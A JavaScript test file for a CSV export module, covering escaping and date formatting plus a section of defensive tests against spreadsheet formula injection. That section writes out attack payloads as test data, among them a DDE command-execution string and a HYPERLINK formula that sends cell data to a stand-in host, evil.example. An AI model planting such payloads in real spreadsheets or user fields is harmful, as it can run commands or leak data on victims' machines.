const { test } = require('node:test');
const assert = require('node:assert/strict');
const { toCsv, formatDateTime, COLUMNS } = require('../csv-export');

test('toCsv: starts with UTF-8 BOM', () => {
  const csv = toCsv([{ a: 'x' }], [{ key: 'a', label: 'A' }]);
  assert.equal(csv.charCodeAt(0), 0xFEFF);
});

test('toCsv: includes header row', () => {
  const csv = toCsv([], [{ key: 'a', label: 'Alpha' }, { key: 'b', label: 'Beta' }]);
  const lines = csv.replace(/^\uFEFF/, '').split('\r\n');
  assert.equal(lines[0], 'Alpha,Beta');
});

test('toCsv: escapes commas by quoting', () => {
  const csv = toCsv([{ a: 'hello, world' }], [{ key: 'a', label: 'A' }]);
  assert.ok(csv.includes('"hello, world"'));
});

test('toCsv: escapes embedded quotes by doubling', () => {
  const csv = toCsv([{ a: 'say "hi"' }], [{ key: 'a', label: 'A' }]);
  assert.ok(csv.includes('"say ""hi"""'));
});

test('toCsv: escapes newlines by quoting', () => {
  const csv = toCsv([{ a: 'line1\nline2' }], [{ key: 'a', label: 'A' }]);
  assert.ok(csv.includes('"line1\nline2"'));
});

test('toCsv: null and undefined become empty', () => {
  const csv = toCsv([{ a: null, b: undefined }], [
    { key: 'a', label: 'A' },
    { key: 'b', label: 'B' },
  ]);
  const dataRow = csv.replace(/^\uFEFF/, '').split('\r\n')[1];
  assert.equal(dataRow, ',');
});

test('toCsv: format function is applied', () => {
  const csv = toCsv(
    [{ n: 1500 }],
    [{ key: 'n', label: 'N', format: v => v.toLocaleString() }]
  );
  assert.ok(csv.includes('1,500') || csv.includes('1500'));
});

test('toCsv: handles empty rows array', () => {
  const csv = toCsv([], [{ key: 'a', label: 'A' }]);
  const lines = csv.replace(/^\uFEFF/, '').split('\r\n');
  assert.equal(lines.length, 1);
  assert.equal(lines[0], 'A');
});

test('formatDateTime: formats Date objects', () => {
  const d = new Date('2026-03-15T09:30:00');
  const formatted = formatDateTime(d);
  assert.match(formatted, /^2026-03-15 \d{2}:\d{2}$/);
});

test('formatDateTime: returns empty for falsy', () => {
  assert.equal(formatDateTime(null), '');
  assert.equal(formatDateTime(undefined), '');
  assert.equal(formatDateTime(''), '');
});

test('formatDateTime: handles invalid dates gracefully', () => {
  const result = formatDateTime('not-a-date');
  assert.equal(result, 'not-a-date');
});

test('COLUMNS presets expose expected keys', () => {
  assert.ok(Array.isArray(COLUMNS.kols));
  assert.ok(Array.isArray(COLUMNS.contacts));
  assert.ok(Array.isArray(COLUMNS.content));
  assert.ok(COLUMNS.kols.some(c => c.key === 'followers'));
  assert.ok(COLUMNS.contacts.some(c => c.key === 'contract_status'));
});

// ==================== Formula injection (audit P2) ====================
//
// Every text column in these exports is KOL-controlled (display_name, bio,
// channel_name). Excel / Sheets / LibreOffice execute a cell that starts with
// =, +, -, @, TAB or CR, so an unescaped export turns a creator's chosen
// display name into code running on whoever opens the file.

test('toCsv: prefixes a leading = so Excel treats it as text', () => {
  const csv = toCsv([{ a: '=1+1' }], [{ key: 'a', label: 'A' }]);
  const row = csv.replace(/^﻿/, '').split('\r\n')[1];
  assert.equal(row, "'=1+1");
});

test('toCsv: neutralizes the classic command-execution payload', () => {
  const evil = "=cmd|'/c calc'!A1";
  const csv = toCsv([{ display_name: evil }], [{ key: 'display_name', label: 'Name' }]);
  const row = csv.replace(/^﻿/, '').split('\r\n')[1];
  // Quoted because of the comma-free but quote-containing content, and the
  // formula trigger is disarmed by the leading apostrophe.
  assert.ok(row.startsWith("'="), `expected disarmed formula, got ${row}`);
  assert.ok(!row.startsWith('='), 'must not start with a bare =');
});

test('toCsv: neutralizes a HYPERLINK exfiltration payload including the comma quoting', () => {
  const evil = '=HYPERLINK("http://evil.example/?leak="&A1,"click me")';
  const csv = toCsv([{ bio: evil }], [{ key: 'bio', label: 'Bio' }]);
  const body = csv.replace(/^﻿/, '').split('\r\n')[1];
  // RFC 4180 quoting still applies (embedded commas + doubled quotes)...
  assert.ok(body.startsWith('"'), 'field with commas must be quoted');
  assert.ok(body.includes('""'), 'embedded quotes must be doubled');
  // ...and inside the quotes the value is prefixed, not raw.
  assert.ok(body.startsWith(`"'=HYPERLINK`), body);
});

test('toCsv: all six trigger characters are neutralized', () => {
  for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
    const value = `${trigger}DANGER`;
    const csv = toCsv([{ a: value }], [{ key: 'a', label: 'A' }]);
    const row = csv.replace(/^﻿/, '').split('\r\n').slice(1).join('\r\n');
    assert.ok(row.includes(`'${trigger}DANGER`), `trigger ${JSON.stringify(trigger)} not neutralized: ${row}`);
  }
});

test('toCsv: header labels are neutralized too', () => {
  const csv = toCsv([], [{ key: 'a', label: '=EVIL()' }]);
  assert.equal(csv.replace(/^﻿/, '').split('\r\n')[0], "'=EVIL()");
});

test('toCsv: plain negative numbers stay numeric (no apostrophe)', () => {
  // Regression guard on the mitigation itself: blanket-prefixing '-' would
  // turn every negative payment amount into text Excel refuses to sum.
  const csv = toCsv(
    [{ n: -50, s: '-50', f: -12.5 }],
    [{ key: 'n', label: 'N' }, { key: 's', label: 'S' }, { key: 'f', label: 'F' }]
  );
  assert.equal(csv.replace(/^﻿/, '').split('\r\n')[1], '-50,-50,-12.5');
});

test('toCsv: a formula disguised as arithmetic is still neutralized', () => {
  const csv = toCsv([{ a: '-1+1+cmd|calc' }], [{ key: 'a', label: 'A' }]);
  const row = csv.replace(/^﻿/, '').split('\r\n')[1];
  assert.ok(row.startsWith("'-1+1"), row);
});

test('toCsv: benign values are untouched', () => {
  const csv = toCsv(
    [{ a: 'Jane Doe', b: 'hello@example.com', c: '1500' }],
    [{ key: 'a', label: 'A' }, { key: 'b', label: 'B' }, { key: 'c', label: 'C' }]
  );
  assert.equal(csv.replace(/^﻿/, '').split('\r\n')[1], 'Jane Doe,hello@example.com,1500');
});
